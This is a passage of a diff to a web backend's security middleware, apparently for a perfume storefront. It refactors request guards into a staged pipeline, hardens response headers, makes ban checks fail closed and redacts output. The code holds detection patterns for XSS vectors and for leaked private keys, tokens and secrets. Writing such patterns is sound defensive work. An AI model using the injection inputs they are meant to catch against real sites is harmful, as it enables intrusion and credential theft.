-    const distributedRate = await diracCentralDistributedRateLimitGuardV146(req, ctx);
-    if (!distributedRate.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, distributedRate.reason);
-    diracCentralStampV146(ctx, 'rate_checked');
-
-    const serverGuard = await diracCentralServerToServerGuardV146(req, res, ctx);
-    if (!serverGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, serverGuard.reason);
-    diracCentralStampV146(ctx, 'server_guard_checked');
-
-    const pageGuard = diracCentralPageBrowserAuthenticityGuardV146(req, ctx);
-    if (!pageGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, pageGuard.reason);
-    diracCentralStampV146(ctx, 'browser_auth_checked');
-
-	    const csrfGuard = diracCentralCsrfGuardV146(req, res, ctx);
-	    if (!csrfGuard.ok) {
-	      return await diracCentralBanAndBlockV146(req, res, ctx, action, method, csrfGuard.reason);
-	    }
-    diracCentralStampV146(ctx, 'csrf_checked');
-
-	    const nonceGuard = diracCentralPageNonceGuardV146(req, res, ctx);
-	    if (!nonceGuard.ok) {
-	      return await diracCentralBanAndBlockV146(req, res, ctx, action, method, nonceGuard.reason);
-	    }
-    diracCentralStampV146(ctx, 'page_nonce_checked');
-
-    const browserSignal = diracCentralBrowserSignalGuardV146(req, ctx);
-    if (!browserSignal.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, browserSignal.reason);
-    diracCentralStampV146(ctx, 'browser_signal_checked');
-
-    const deviceGuard = diracCentralDeviceConsistencyGuardV146(req, ctx);
-    if (!deviceGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, deviceGuard.reason);
-    diracCentralStampV146(ctx, 'device_checked');
-
-    const adminGuard = await diracCentralAdminAuthGuardV146(req, res, ctx);
-    if (!adminGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, adminGuard.reason);
-    diracCentralStampV146(ctx, 'admin_checked');
-
-    const publicGuard = diracCentralPublicReadGuardV146(req, ctx);
-    if (!publicGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, publicGuard.reason);
-    diracCentralStampV146(ctx, 'public_read_checked');
-
-    const bodyGuard = await diracCentralBodyHandlingGuardV146(req, ctx);
-    if (!bodyGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, bodyGuard.reason);
-    diracCentralStampV146(ctx, 'body_checked');
-
-    const lightGuard = diracCentralLightGuardV146(req, ctx);
-    if (!lightGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, lightGuard.reason);
-    diracCentralStampV146(ctx, 'light_checked');
-
-    const contractGuard = diracCentralContractGuardV146(req, ctx);
-    if (!contractGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, contractGuard.reason);
-    diracCentralStampV146(ctx, 'contract_checked');
-
-    const a2fSignature = diracCentralA2FRequestSignatureGuardV148(req, ctx);
-    if (!a2fSignature.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, a2fSignature.reason);
-    diracCentralStampV146(ctx, 'a2f_signature_checked');
-
-    if (action === 'security_report') {
-      const reportGuard = diracCentralSecurityReportGuardV146(req, ctx);
-      if (!reportGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, reportGuard.reason);
-      diracCentralStampV146(ctx, 'security_report_checked');
-      return await diracCentralBanAndBlockV146(req, res, ctx, action, method, 'html_security_report');
+    for (let stageIndex = 0; stageIndex < SECURITY_PIPELINE.length; stageIndex += 1) {
+      const stage = SECURITY_PIPELINE[stageIndex];
+      ctx.currentStageV211 = String(stage && stage.name || 'unknown_stage');
+      ctx.currentStageIndexV211 = stageIndex;
+      const stageStartedAt = Date.now();
+      const elapsedBeforeStageV221 = stageStartedAt - Number(ctx.startedAt || stageStartedAt);
+      if (elapsedBeforeStageV221 > diracCentralGuardBudgetMsV221(ctx)) {
+        ctx.failedStageV211 = ctx.currentStageV211;
+        ctx.failureReasonV211 = 'central_guard_time_budget_exceeded';
+        ctx.failureClassificationV221 = diracCentralClassifyFailureV221(ctx.failureReasonV211, ctx.currentStageV211, '');
+        diracCentralEmitDebugV211(ctx, 'request_blocked', { reason: ctx.failureReasonV211, elapsed_ms: elapsedBeforeStageV221 });
+        return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action || 'central_guard_error', method, ctx.failureReasonV211);
+      }
+      let result;
+      try {
+        result = await stage.guard(ctx);
+      } catch (stageError) {
+        ctx.failedStageV211 = ctx.currentStageV211;
+        ctx.failureReasonV211 = 'central_guard_stage_exception';
+        ctx.stageTraceV211.push(Object.freeze({ index: stageIndex, stage: ctx.currentStageV211, result: 'exception', duration_ms: Date.now() - stageStartedAt }));
+        try { stageError.diracStage = ctx.currentStageV211; stageError.diracStageIndex = stageIndex; } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+        throw stageError;
+      }
+      const stageResult = result && result.ok === true ? 'passed' : 'blocked';
+      ctx.stageTraceV211.push(Object.freeze({ index: stageIndex, stage: ctx.currentStageV211, result: stageResult, duration_ms: Date.now() - stageStartedAt }));
+      if (!result || result.ok !== true) {
+        const reason = String(result && result.reason || result && result.directCode || 'central_guard_stage_failed');
+        ctx.failedStageV211 = ctx.currentStageV211;
+        ctx.failureReasonV211 = reason;
+        ctx.failureClassificationV221 = diracCentralClassifyFailureV221(reason, ctx.currentStageV211, result && result.directCode);
+        diracCentralEmitDebugV211(ctx, 'request_blocked', {
+          direct_code: String(result && result.directCode || ''),
+          decision: String(result && result.decision || ''),
+          failure_class: ctx.failureClassificationV221.failureClass,
+          severity: ctx.failureClassificationV221.severity,
+          threat: ctx.threatEvidenceV221 || undefined
+        });
+        if (result && result.directCode) return diracCentralBlockedResponseV146(res, result.directCode);
+        return await diracCentralBanAndBlockV146(req, res, ctx, String(result && result.action || ctx.action || 'central_guard_error'), method, reason);
+      }
+      diracCentralStampV146(ctx, stage.stamp, result.decision || 'passed');
     }
 
-    ctx.skipHeavyScan = false;
+    if ((ctx.passport & DIRAC_V202_ALL_CHECKPOINTS) !== DIRAC_V202_ALL_CHECKPOINTS) {
+      return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action || 'central_guard_error', method, 'central_guard_integrity_final_incomplete');
+    }
+    if (ctx.terminalResponse === 'disabled') return diracCentralDisabledResponseV146(res);
+    if (ctx.terminalResponse === 'mfa_required_v221') return diracCentralMfaRequiredResponseV221(res, ctx);
+    if (ctx.terminalBlockReason) return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action, method, ctx.terminalBlockReason);
 
-    const sampleGuard = diracCentralSampleCollectorV146(req, ctx);
-    if (!sampleGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, sampleGuard.reason);
-    diracCentralStampV146(ctx, 'sample_checked');
-
-    const normalized = diracCentralNormalizeSampleV146(ctx.sample);
-    const threat = diracCentralThreatPatternGuardV146(normalized, ctx);
-    if (threat.detected) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, threat.kind);
-    diracCentralStampV146(ctx, 'threat_checked');
-
-    const zeroDay = diracCentralZeroDayShieldV146(req, ctx, normalized);
-    if (!zeroDay.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, zeroDay.reason);
-    diracCentralStampV146(ctx, 'zeroday_checked');
-
-    const idor = await diracCentralIdorBolaGuardV146(req, ctx);
-    if (!idor.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, idor.reason);
-    diracCentralStampV146(ctx, 'idor_checked');
-
-    const circuit = await diracCentralCircuitBreakerV146(req, ctx, 'allow');
-    if (!circuit.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, circuit.reason);
-    diracCentralStampV146(ctx, 'circuit_checked');
-
-    const stableMfaGate = diracCentralStableMfaReadGateV146(req, res, ctx);
-    if (stableMfaGate.handled) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, stableMfaGate.reason || 'mfa_required');
-    diracCentralStampV146(ctx, 'mfa_checked');
-
-    const integrity = diracCentralIntegrityVerifierV146(ctx);
-    if (!integrity.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, integrity.reason);
-
+    ctx.currentStageV211 = 'dispatch';
+    ctx.currentStageIndexV211 = SECURITY_PIPELINE.length;
+    ctx.centralGuardFullyPassedV211 = true;
+    ctx.executionPhaseV211 = 'handler';
     req.__diracCentralSecurityGuardPassedV146 = true;
+    try { Object.defineProperty(req, '__diracCentralSecurityGuardPassedV146', { value: true, writable: false, enumerable: false, configurable: false }); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    try { Object.defineProperty(req, '__diracCentralRequestIdV211', { value: ctx.requestId, writable: false, enumerable: false, configurable: false }); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+
+    if (diracCentralVerifiedOwnerActionV217(ctx.action)) {
+      let resolvedOwnerV215 = diracCentralOwnerFromStage26V217(ctx);
+      let ownerSourceV215 = resolvedOwnerV215 ? 'stage26_idor_bola_owner_binding' : 'pre_dispatch_owner_resolution';
+      if (!resolvedOwnerV215) {
+        ctx.__diracCentralOwnerScopeResolvingV146 = true;
+        try {
+          resolvedOwnerV215 = await diracCentralResolveOwnerV146(req);
+        } catch (error) {
+          ctx.ownerResolutionDebugV212 = ctx.ownerResolutionDebugV212 || {
+            patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+            final_code: 'VERIFIED_OWNER_PRE_DISPATCH_RESOLUTION_EXCEPTION',
+            failure_point: 'diracCentralSecurityGuardV146.verified_owner_pre_dispatch',
+            error: diracCentralSafeDiagnosticErrorV212(error)
+          };
+        } finally {
+          ctx.__diracCentralOwnerScopeResolvingV146 = false;
+        }
+      }
+      const sealedOwnerV215 = diracCentralSealVerifiedOwnerContextV215(req, resolvedOwnerV215, ownerSourceV215);
+      if (!sealedOwnerV215 || sealedOwnerV215.ok !== true) {
+        const reasonV215 = String(sealedOwnerV215 && sealedOwnerV215.reason || resolvedOwnerV215 && resolvedOwnerV215.reason || 'verified_owner_context_seal_failed');
+        ctx.failedStageV211 = 'verified owner context';
+        ctx.failureReasonV211 = reasonV215;
+        diracCentralEmitDebugV211(ctx, 'request_blocked', {
+          reason: reasonV215,
+          diagnostic_code: 'VERIFIED_OWNER_CONTEXT_SEAL_FAILED',
+          failure_point: 'diracCentralSecurityGuardV146.pre_dispatch_owner_context',
+          owner_resolution_debug: ctx.ownerResolutionDebugV212 || undefined
+        });
+        return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action, method, reasonV215);
+      }
+    }
+
+    diracCentralEmitDebugV211(ctx, 'request_passed', { checkpoint_count: SECURITY_PIPELINE.length });
+    if (ctx.__diracS2SSecurityReportResultV206) {
+      return res.status(200).json(ctx.__diracS2SSecurityReportResultV206);
+    }
     return await nextHandler(req, res);
   } catch (error) {
+    if (ctx && !ctx.failedStageV211) ctx.failedStageV211 = String(error && error.diracStage || ctx.currentStageV211 || 'central_guard');
+    if (ctx && !ctx.failureReasonV211) ctx.failureReasonV211 = String(error && error.code || error && error.message || 'central_guard_error').slice(0, 120);
+    if (ctx) ctx.failureClassificationV221 = diracCentralClassifyFailureV221(ctx.failureReasonV211, ctx.failedStageV211, '');
     const safeDebug = diracCentralSafeDebugErrorV155(error, ctx);
-    try { console.error('[dirac-central-security-v146]', safeDebug); } catch (_) {}
+    diracCentralEmitDebugV211(ctx, 'central_exception', safeDebug);
+    try { console.error('[dirac-central-security-v202]', safeDebug); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
     if (ctx) ctx.centralErrorDebugV155 = safeDebug;
     if (ctx && req && req.__diracCentralSecurityGuardPassedV146 && ctx.action === 'domain_dashboard_me') {
       return await diracCentralBanAndBlockV146(req, res, ctx, ctx.action, method, 'domain_dashboard_handler_error');
@@ -25946,12 +34005,21 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
     return diracCentralBlockedResponseV146(res, 'CENTRAL_GUARD_ERROR');
   } finally {
     if (ctx) {
+      try { diracCentralReleaseRateLeaseV221(ctx); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      try { if (ctx.__diracCentralSupabaseRequestCacheV151 instanceof Map) ctx.__diracCentralSupabaseRequestCacheV151.clear(); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      try { if (ctx.__diracCentralOwnerBoundObjectValuesV194 instanceof Set) ctx.__diracCentralOwnerBoundObjectValuesV194.clear(); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      try { if (req && typeof req === 'object') DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXTS_V215.delete(req); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      ctx.normalizedSampleV202 = null;
+      ctx.sample = null;
+      ctx.body = null;
       const last = DIRAC_CENTRAL_CONTEXT_STACK_V146[DIRAC_CENTRAL_CONTEXT_STACK_V146.length - 1];
       if (last === ctx) DIRAC_CENTRAL_CONTEXT_STACK_V146.pop();
       else {
         const idx = DIRAC_CENTRAL_CONTEXT_STACK_V146.indexOf(ctx);
         if (idx >= 0) DIRAC_CENTRAL_CONTEXT_STACK_V146.splice(idx, 1);
       }
+      ctx.executionPhaseV211 = 'closed';
+      ctx.currentStageV211 = 'closed';
       diracCentralSetCurrentContextV149(null);
     }
   }
@@ -25959,13 +34027,57 @@ async function diracCentralSecurityGuardV146(req, res, nextHandler) {
 
 function diracCentralApplyHeadersV146(res) {
   if (!res || typeof res.setHeader !== 'function') return;
-  try { res.setHeader('X-Dirac-Central-Security-Guard', DIRAC_CENTRAL_SECURITY_GUARD_V146); } catch (_) {}
-  try { res.setHeader('X-Dirac-Dashboard-Session-Fix', 'v147-bola-direct-timeout-fast-self-read'); } catch (_) {}
-  try { res.setHeader('Cache-Control', 'no-store'); } catch (_) {}
-  try { res.setHeader('X-Content-Type-Options', 'nosniff'); } catch (_) {}
-  try { res.setHeader('Content-Security-Policy', "default-src 'self'; base-uri 'self'; frame-ancestors 'none'; object-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; connect-src 'self' https://diracgroup.store https://www.diracgroup.store"); } catch (_) {}
-  try { res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin'); } catch (_) {}
-  try { res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), fullscreen=(self)'); } catch (_) {}
+  try {
+    const ctx = diracCentralCurrentContextV149();
+    if (ctx && ctx.requestId) res.setHeader('X-Dirac-Request-Id', String(ctx.requestId).slice(0, 64));
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Cache-Control', 'no-store'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Content-Type-Options', 'nosniff'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Frame-Options', 'DENY'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Cross-Origin-Opener-Policy', 'same-origin'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Cross-Origin-Resource-Policy', 'same-site'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Origin-Agent-Cluster', '?1'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Permitted-Cross-Domain-Policies', 'none'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  if (diracCentralIsProductionV146()) {
+    try { res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  }
+  try { res.setHeader('Content-Security-Policy', "default-src 'self'; base-uri 'none'; frame-ancestors 'none'; object-src 'none'; form-action 'self'; script-src 'self'; script-src-attr 'none'; style-src 'self'; img-src 'self' data: https:; connect-src 'self' https://diracgroup.store https://www.diracgroup.store; upgrade-insecure-requests"); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), browsing-topics=(), interest-cohort=(), fullscreen=(self)'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-DNS-Prefetch-Control', 'off'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try { res.setHeader('X-Download-Options', 'noopen'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+}
+
+function diracCentralSecureJsonSerializeV230(payload) {
+  const seen = new WeakSet();
+  const ctx = diracCentralCurrentContextV149();
+  const isPublicPerfumeCatalog = Boolean(
+    ctx
+    && String(ctx.method || '').toUpperCase() === 'GET'
+    && diracPerfumePublicProductsV117IsCatalogAction(String(ctx.action || ''))
+  );
+  const maximumNodes = isPublicPerfumeCatalog ? 30000 : 10000;
+  let nodes = 0;
+  const inspect = (value, depth) => {
+    nodes += 1;
+    if (nodes > maximumNodes || depth > 12) throw Object.assign(new Error('DIRAC_OUTPUT_COMPLEXITY_REJECTED'), { code: 'DIRAC_OUTPUT_COMPLEXITY_REJECTED' });
+    if (value === null || value === undefined || typeof value !== 'object') return;
+    if (seen.has(value)) throw Object.assign(new Error('DIRAC_OUTPUT_CIRCULAR_REJECTED'), { code: 'DIRAC_OUTPUT_CIRCULAR_REJECTED' });
+    seen.add(value);
+    if (!Array.isArray(value)) {
+      const proto = Object.getPrototypeOf(value);
+      if (proto !== Object.prototype && proto !== null) throw Object.assign(new Error('DIRAC_OUTPUT_PROTOTYPE_REJECTED'), { code: 'DIRAC_OUTPUT_PROTOTYPE_REJECTED' });
+      if (Object.keys(value).length > 1000 || Object.getOwnPropertySymbols(value).length) throw Object.assign(new Error('DIRAC_OUTPUT_SHAPE_REJECTED'), { code: 'DIRAC_OUTPUT_SHAPE_REJECTED' });
+    }
+    for (const child of Array.isArray(value) ? value : Object.values(value)) inspect(child, depth + 1);
+  };
+  inspect(payload, 0);
+  if (diracCentralPayloadContainsRuntimeSecretV194(payload, nodes)) throw Object.assign(new Error('CENTRAL_OUTPUT_SECRET_BLOCKED'), { code: 'CENTRAL_OUTPUT_SECRET_BLOCKED' });
+  const sanitized = diracCentralSanitizeOutputV146(payload, 0);
+  const serialized = JSON.stringify(sanitized);
+  const maximum = Math.max(64 * 1024, Math.min(8 * 1024 * 1024, Number(process.env.DIRAC_OUTPUT_MAX_BYTES || 2 * 1024 * 1024)));
+  if (Buffer.byteLength(serialized, 'utf8') > maximum) throw Object.assign(new Error('DIRAC_OUTPUT_TOO_LARGE'), { code: 'DIRAC_OUTPUT_TOO_LARGE' });
+  return sanitized;
 }
 
 function diracCentralWrapJsonResponseV146(res) {
@@ -25973,31 +34085,84 @@ function diracCentralWrapJsonResponseV146(res) {
   const originalJson = res.json.bind(res);
   res.json = function diracCentralJsonResponseGuardV146(payload) {
     diracCentralApplyHeadersV146(res);
-    return originalJson(diracCentralSanitizeOutputV146(payload, 0));
+    try { res.setHeader('Content-Type', 'application/json; charset=utf-8'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    try {
+      return originalJson(diracCentralSecureJsonSerializeV230(payload));
+    } catch (error) {
+      diracCentralRecordSuppressedExceptionV221(error);
+      try { if (typeof res.status === 'function') res.status(500); else res.statusCode = 500; } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+      return originalJson({ ok: false, code: String(error && error.code || 'CENTRAL_OUTPUT_BLOCKED'), message: 'Respons ditolak oleh sistem keamanan.' });
+    }
   };
   res.__diracCentralJsonWrappedV146 = true;
 }
 
-function diracCentralSanitizeOutputV146(value, depth) {
-  if (depth > 8 || value === null || value === undefined) return value;
-  if (typeof value === 'string') {
-    return value
-      .replace(/<script/gi, '&lt;script')
-      .replace(/<\/script/gi, '&lt;/script')
-      .replace(/javascript:/gi, 'javascript-blocked:')
-      .replace(/\bon[a-z]{3,30}\s*=/gi, 'data-blocked=');
+function diracCentralRedactOutputStringV228(value) {
+  let text = String(value || '').replace(/[\u0000\u202a-\u202e\u2066-\u2069]/g, '');
+  text = text
+    .replace(/-----BEGIN(?: RSA| EC| OPENSSH)? PRIVATE KEY-----[\s\S]*?-----END(?: RSA| EC| OPENSSH)? PRIVATE KEY-----/gi, '[redacted-private-key]')
+    .replace(/\bBearer\s+[A-Za-z0-9._~+\/-]{16,}={0,2}\b/gi, 'Bearer [redacted]')
+    .replace(/\beyJ[A-Za-z0-9_-]{12,}\.[A-Za-z0-9_-]{12,}\.[A-Za-z0-9_-]{8,}\b/g, '[redacted-jwt]')
+    .replace(/\b(?:sk|rk|whsec|SB-Mid-server|Mid-server)[A-Za-z0-9_.:-]{12,}\b/g, '[redacted-secret]');
+  const decoded = diracCentralHtmlEntityDecodeV146(text);
+  if (/<\s*\/?\s*(?:script|svg|iframe|object|embed|math|meta|link)\b|\bon[a-z]{3,30}\s*=|(?:javascript|vbscript)\s*:|data\s*:\s*text\/html|expression\s*\(/i.test(decoded)) {
+    text = text
+      .replace(/(?:javascript|vbscript)\s*:/gi, '[blocked-script-scheme]:')
+      .replace(/data\s*:\s*text\/html/gi, '[blocked-data-html]')
+      .replace(/\bon([a-z]{3,30})\s*=/gi, '[blocked-event-$1]=')
+      .replace(/expression\s*\(/gi, '[blocked-css-expression](')
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
   }
+  return text;
+}
+
+function diracCentralSanitizeOutputV146(value, depth) {
+  if (value === null || value === undefined) return value;
+  if (depth > 8) return null;
+  if (typeof value === 'string') return diracCentralRedactOutputStringV228(value);
   if (Array.isArray(value)) return value.slice(0, 1000).map((item) => diracCentralSanitizeOutputV146(item, depth + 1));
   if (typeof value === 'object') {
-    const out = {};
+    const out = Object.create(null);
     Object.entries(value).slice(0, 1000).forEach(([key, child]) => {
       const cleanKey = String(key || '').replace(/[\u0000-\u001f\u007f<>]/g, '').slice(0, 120);
-      if (/secret|service_role|authorization|access_token|refresh_token|password|cookie|apikey|api_key/i.test(cleanKey)) return;
+      if (!cleanKey || /^(?:__proto__|prototype|constructor)$/i.test(cleanKey)) return;
+      if (/secret|service_role|authorization|access_token|refresh_token|password|cookie|apikey|api_key|private_key|client_secret|signature_key/i.test(cleanKey)) return;
       out[cleanKey] = diracCentralSanitizeOutputV146(child, depth + 1);
     });
     return out;
   }
   return value;
+}
+
+function diracCentralPayloadContainsRuntimeSecretV194(payload, maximumVisits) {
+  const secrets = diracCentralRuntimeSecretEntriesV194(true).map((entry) => entry.value);
+  if (!secrets.length) return false;
+  const seen = new WeakSet();
+  const stack = [{ value: payload, depth: 0 }];
+  const visitLimit = Number.isSafeInteger(maximumVisits) && maximumVisits > 0 ? maximumVisits : 10000;
+  let visited = 0;
+  while (stack.length && visited < visitLimit) {
+    const current = stack.pop();
+    const value = current.value;
+    visited += 1;
+    if (typeof value === 'string') {
+      if (secrets.some((secret) => value.includes(secret))) return true;
+      continue;
+    }
+    if (Buffer.isBuffer(value) || value instanceof Uint8Array) {
+      const text = Buffer.from(value).toString('utf8');
+      if (secrets.some((secret) => text.includes(secret))) return true;
+      continue;
+    }
+    if (!value || typeof value !== 'object' || seen.has(value)) continue;
+    if (current.depth >= 12) return true;
+    seen.add(value);
+    for (const [key, child] of Object.entries(value).slice(0, 1000)) {
+      if (secrets.some((secret) => String(key).includes(secret))) return true;
+      stack.push({ value: child, depth: current.depth + 1 });
+    }
+  }
+  return stack.length > 0;
 }
 
 async function diracCentralBuildIdentityV146(req) {
@@ -26028,14 +34193,14 @@ async function diracCentralBuildIdentityV146(req) {
       const payload = decodeJwtPayloadUnsafe(cookies[ACCESS_COOKIE]);
       authUserId = String(payload && (payload.sub || payload.user_id || payload.id) || '').trim();
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   if (!authUserId) {
     try {
       if (typeof readSignedDomainSessionUser === 'function') {
         const signed = await readSignedDomainSessionUser(cookies).catch(() => null);
         authUserId = String(signed && signed.id || '').trim();
       }
-    } catch (_) {}
+    } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   }
 
   const loggedIn = Boolean(authUserId || sessionMaterial);
@@ -26061,31 +34226,54 @@ function diracCentralCheckMemoryBanV146(identity) {
 async function diracCentralCheckPersistentBanV146(req, identity) {
   const now = Date.now();
   const key = String(identity && identity.key || '');
-  const neg = DIRAC_CENTRAL_NEGATIVE_BAN_V146.get(key);
-  if (!diracCentralIsProductionV146() && neg && Number(neg.until || 0) > now) return { blocked: false, negativeCache: true };
+  DIRAC_CENTRAL_NEGATIVE_BAN_V146.delete(key);
 
   let storageChecked = false;
   try {
-    if (typeof diracV107CheckActiveBan === 'function') {
-      storageChecked = true;
+    if (typeof readPersistentSecurityJsonManyStrictV194 === 'function' && typeof diracV107BuildKeys === 'function') {
+      const hardBanKeys = diracV107BuildKeys(req || {}).map((item) => String(item && item.key || '')).filter(Boolean).slice(0, 40);
+      const hardBanLookup = await readPersistentSecurityJsonManyStrictV194(hardBanKeys);
+      if (!hardBanLookup.ok) {
+        return { blocked: true, blockedUntilMs: now + diracCentralBlockMsV146(), failClosed: true, reason: 'persistent_ban_store_unavailable' };
+      } else {
+        storageChecked = true;
+        const active = hardBanLookup.records.find((record) => Number(record && record.blocked_until_ms || 0) > now);
+        if (active) return { blocked: true, blockedUntilMs: Number(active.blocked_until_ms) };
+      }
+    } else if (typeof diracV107CheckActiveBan === 'function') {
       const existing = await diracV107CheckActiveBan(req);
+      storageChecked = true;
       if (existing && existing.blocked) {
         return { blocked: true, blockedUntilMs: now + Math.max(1, Number(existing.retryAfterSeconds || 86400)) * 1000 };
       }
     }
-  } catch (_) {}
+  } catch (_) {
+    return { blocked: true, blockedUntilMs: now + diracCentralBlockMsV146(), failClosed: true };
+  }
 
   try {
-    if (typeof readPersistentSecurityJson === 'function') {
+    if (typeof readPersistentSecurityJsonStrictV194 === 'function') {
+      const lookup = await readPersistentSecurityJsonStrictV194(key);
+      if (!lookup.ok) {
+        return { blocked: true, blockedUntilMs: now + diracCentralBlockMsV146(), failClosed: true, reason: 'persistent_ban_identity_store_unavailable' };
+      } else {
+        storageChecked = true;
+        const record = lookup.record;
+        const blockedUntilMs = Number(record && (record.blocked_until_ms || record.blockedUntilMs) || 0);
+        if (blockedUntilMs > now) return { blocked: true, blockedUntilMs };
+      }
+    } else if (typeof readPersistentSecurityJson === 'function') {
+      const record = await readPersistentSecurityJson(key);
       storageChecked = true;
-      const record = await readPersistentSecurityJson(key).catch(() => null);
       const blockedUntilMs = Number(record && (record.blocked_until_ms || record.blockedUntilMs) || 0);
       if (blockedUntilMs > now) return { blocked: true, blockedUntilMs };
     }
-  } catch (_) {}
-
-  if (diracCentralIsProductionV146() && (!storageChecked || !LOGIN_SECURITY_PERSIST_TABLE)) {
+  } catch (_) {
     return { blocked: true, blockedUntilMs: now + diracCentralBlockMsV146(), failClosed: true };
+  }
+
+  if (!storageChecked || !LOGIN_SECURITY_PERSIST_TABLE) {
+    return { blocked: true, blockedUntilMs: now + diracCentralBlockMsV146(), failClosed: true, reason: 'persistent_ban_storage_required' };
   }
 
   return { blocked: false };
@@ -26159,12 +34347,11 @@ function diracCentralVercel2OnlyActionGuardV150(action) {
   const vercel2OnlyActions = diracCentralVercel2OnlyActionsV150();
   if (!vercel2OnlyActions.has(clean)) return { ok: true };
 
-  if (diracCentralEnvTrueV150('DIRAC_CENTRAL_VERCEL2_ACTIONS_ENABLED')) return { ok: true };
-  if (diracCentralEnvTrueV150('DIRAC_VERCEL2_ACTIONS_ENABLED')) return { ok: true };
-  if (diracCentralEnvValueV150('DIRAC_CENTRAL_DEPLOYMENT_ROLE') === 'vercel2') return { ok: true };
-  if (diracCentralEnvValueV150('DIRAC_DEPLOYMENT_ROLE') === 'vercel2') return { ok: true };
-
-  return { ok: false, reason: 'vercel2_only_action_blocked' };
+  const role = diracCentralEnvValueV150('DIRAC_CENTRAL_DEPLOYMENT_ROLE') || diracCentralEnvValueV150('DIRAC_DEPLOYMENT_ROLE');
+  const enabled = diracCentralEnvTrueV150('DIRAC_CENTRAL_VERCEL2_ACTIONS_ENABLED') || diracCentralEnvTrueV150('DIRAC_VERCEL2_ACTIONS_ENABLED');
+  return role === 'vercel2' && enabled
+    ? { ok: true }
+    : { ok: false, reason: 'vercel2_only_action_blocked' };
 }
 
 function diracCentralVercel2OnlyActionsV150() {
@@ -26175,9 +34362,74 @@ function diracCentralVercel2OnlyActionsV150() {
     String(typeof DIRAC_RECOVERY_WORKER_ACTION !== 'undefined' ? DIRAC_RECOVERY_WORKER_ACTION : '').trim().toLowerCase()
   ].filter(Boolean));
 
-  for (const item of diracCentralEnvCsvV150('DIRAC_CENTRAL_VERCEL2_ONLY_ACTIONS')) actions.add(item);
